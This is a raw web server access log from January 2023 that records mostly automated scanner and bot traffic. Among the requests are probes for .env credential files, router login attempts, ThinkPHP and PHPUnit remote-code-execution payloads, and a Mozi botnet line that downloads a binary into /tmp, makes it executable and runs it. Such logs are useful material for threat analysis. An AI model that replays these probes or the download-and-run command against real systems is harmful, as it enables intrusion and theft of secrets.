2001:470:1:332::165 - - [16/Jan/2023:21:28:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
2001:470:1:332::159 - - [16/Jan/2023:21:28:36 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
128.14.133.58 - - [16/Jan/2023:21:57:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:22:09:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.104.131.24 - - [16/Jan/2023:22:16:51 -0600] "ABCDEFGHIJKLMNOPQRSTUVWXYZ9999" 400 226 "-" "-"
179.43.177.242 - - [16/Jan/2023:22:21:57 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [16/Jan/2023:22:25:02 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
192.241.225.23 - - [16/Jan/2023:22:42:13 -0600] "GET /ReportServer HTTP/1.1" 301 244 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.151 - - [16/Jan/2023:22:58:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
143.110.222.166 - - [16/Jan/2023:23:05:05 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [16/Jan/2023:23:09:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
92.118.39.29 - - [16/Jan/2023:23:21:29 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
185.254.196.223 - - [16/Jan/2023:23:25:16 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:23:25:17 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.243.130.9 - - [16/Jan/2023:23:37:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 zgrab/0.x"
118.239.32.33 - - [17/Jan/2023:00:01:25 -0600] "POST /HNAP1/ HTTP/1.0" 400 591 "-" "-"
143.110.222.166 - - [17/Jan/2023:00:09:52 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [17/Jan/2023:01:10:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [17/Jan/2023:01:15:21 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
74.82.47.3 - - [17/Jan/2023:01:53:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
74.82.47.3 - - [17/Jan/2023:01:57:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"
74.82.47.3 - - [17/Jan/2023:01:58:33 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42"
143.110.222.166 - - [17/Jan/2023:02:08:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
36.40.72.66 - - [17/Jan/2023:02:21:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [17/Jan/2023:02:25:52 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [17/Jan/2023:02:25:52 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [17/Jan/2023:02:27:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
35.213.211.88 - - [17/Jan/2023:02:48:58 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.1; bit.ly/3eZNDnO; 1d92b1ca6b) Chrome/84.0.4147.105 Safari/537.36"
35.213.211.88 - - [17/Jan/2023:02:48:59 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.1; bit.ly/3eZNDnO; 1d92b1ca6b) Chrome/84.0.4147.105 Safari/537.36"
143.110.222.166 - - [17/Jan/2023:03:06:50 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [17/Jan/2023:03:15:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
137.184.202.128 - - [17/Jan/2023:03:20:47 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
137.184.202.128 - - [17/Jan/2023:03:20:47 -0600] "\x16\x03\x01" 400 226 "-" "-"
137.184.202.128 - - [17/Jan/2023:03:20:47 -0600] "\x16\x03\x01" 400 226 "-" "-"
205.185.118.237 - - [17/Jan/2023:03:50:44 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
190.109.234.7 - - [17/Jan/2023:03:53:58 -0600] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
143.110.222.166 - - [17/Jan/2023:04:07:28 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.95.25 - - [17/Jan/2023:04:20:02 -0600] "CONNECT cipicaoadminpanel.xyz:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
34.78.6.216 - - [17/Jan/2023:04:55:59 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.1"
157.245.157.209 - - [17/Jan/2023:05:02:42 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:02:50 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:02:52 -0600] "GET /core/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:02:55 -0600] "GET /beta/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:02:59 -0600] "GET /backend/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:03 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:06 -0600] "GET /kyc/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:08 -0600] "GET /frontend/.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:10 -0600] "GET /admin/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:13 -0600] "GET /prod/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:16 -0600] "GET /api/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:18 -0600] "GET /production/.env HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:23 -0600] "GET /home/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:31 -0600] "GET /.env.example HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:34 -0600] "GET /.env.local HTTP/1.1" 301 242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:37 -0600] "GET /.env.bak HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:44 -0600] "GET /blog/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:03:46 -0600] "GET /local/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [17/Jan/2023:05:08:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
38.128.66.69 - - [17/Jan/2023:05:09:24 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
157.245.157.209 - - [17/Jan/2023:05:21:19 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:22 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:29 -0600] "GET /core/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:32 -0600] "GET /beta/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:36 -0600] "GET /backend/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:38 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:42 -0600] "GET /kyc/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:45 -0600] "GET /frontend/.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:48 -0600] "GET /admin/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:50 -0600] "GET /prod/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:21:59 -0600] "GET /api/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:22:02 -0600] "GET /production/.env HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:22:06 -0600] "GET /home/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:22:11 -0600] "GET /.env.example HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:22:12 -0600] "GET /.env.local HTTP/1.1" 301 242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:22:17 -0600] "GET /.env.bak HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:22:20 -0600] "GET /blog/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.157.209 - - [17/Jan/2023:05:22:25 -0600] "GET /local/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [17/Jan/2023:05:22:37 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.254.196.223 - - [17/Jan/2023:05:25:06 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [17/Jan/2023:05:25:06 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.15.22.151 - - [17/Jan/2023:05:25:21 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
3.15.22.151 - - [17/Jan/2023:05:25:21 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
143.110.222.166 - - [17/Jan/2023:06:05:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [17/Jan/2023:06:20:52 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
188.32.178.102 - - [17/Jan/2023:06:21:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
80.94.92.57 - - [17/Jan/2023:06:27:29 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [17/Jan/2023:06:29:20 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.12.253.180 - - [17/Jan/2023:06:32:40 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.12.253.180 - - [17/Jan/2023:06:32:47 -0600] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
5.188.210.227 - - [17/Jan/2023:06:36:12 -0600] "GET http://5.188.210.227/echo.php HTTP/1.1" 301 240 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
179.43.177.242 - - [17/Jan/2023:06:37:13 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
152.89.196.211 - - [17/Jan/2023:06:37:16 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [17/Jan/2023:06:47:27 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [17/Jan/2023:06:57:04 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
87.236.176.30 - - [17/Jan/2023:06:59:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
92.118.39.29 - - [17/Jan/2023:07:11:24 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [17/Jan/2023:07:11:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [17/Jan/2023:07:14:07 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [17/Jan/2023:07:28:53 -0600] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [17/Jan/2023:07:36:13 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [17/Jan/2023:07:42:24 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
139.162.219.177 - - [17/Jan/2023:07:46:00 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
139.162.219.177 - - [17/Jan/2023:07:46:08 -0600] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.188.210 - - [17/Jan/2023:07:57:08 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
128.14.188.210 - - [17/Jan/2023:07:59:29 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
128.14.188.210 - - [17/Jan/2023:07:59:37 -0600] "GET //favicon.ico HTTP/1.1" 301 252 "-" "python-requests/2.23.0"
152.89.196.211 - - [17/Jan/2023:08:00:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
64.227.40.15 - - [17/Jan/2023:08:04:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
143.110.222.166 - - [17/Jan/2023:08:09:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [17/Jan/2023:08:24:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.254.196.223 - - [17/Jan/2023:08:25:48 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [17/Jan/2023:08:25:48 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [17/Jan/2023:08:46:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [17/Jan/2023:09:07:09 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [17/Jan/2023:09:13:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [17/Jan/2023:09:22:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.118.39.29 - - [17/Jan/2023:09:40:11 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
180.149.125.159 - - [17/Jan/2023:10:08:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
143.110.222.166 - - [17/Jan/2023:10:12:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
128.14.209.162 - - [17/Jan/2023:10:17:44 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.35.18.107 - - [17/Jan/2023:10:18:33 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [17/Jan/2023:10:25:53 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
